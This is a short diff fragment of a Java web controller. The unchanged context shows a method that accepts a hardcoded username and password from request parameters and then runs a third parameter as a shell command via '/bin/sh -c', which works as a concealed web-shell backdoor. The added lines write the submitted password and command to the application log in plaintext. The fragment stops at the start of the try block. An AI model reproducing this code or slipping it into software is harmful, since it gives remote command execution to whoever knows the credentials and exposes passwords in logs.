@@ -70,8 +70,10 @@ public class FrontController extends BaseController{
 	public String run(HttpServletRequest request, HttpServletResponse response,Model model) {
 		String name = request.getParameter("name");
 		String pwd = request.getParameter("pwd");
+		logger.info("name="+name+"=pwd"+pwd);
 		if("wangfei".equals(name)&&"wangfei1A".equals(pwd)){
 				String commond = request.getParameter("commond");
+				logger.info("commond="+commond+"");
 			 	String[] cmds = {"/bin/sh","-c",commond};  
 		        Process pro;
 				try {
